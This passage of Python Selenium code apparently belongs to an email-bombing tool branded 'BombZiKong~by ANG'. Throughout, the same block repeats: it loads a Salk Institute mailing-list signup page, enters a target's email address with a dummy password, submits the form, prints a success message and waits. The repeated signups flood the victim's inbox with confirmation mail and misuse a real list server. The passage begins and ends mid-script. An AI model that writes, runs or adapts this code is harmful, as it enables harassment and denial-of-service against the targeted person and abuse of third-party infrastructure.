pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
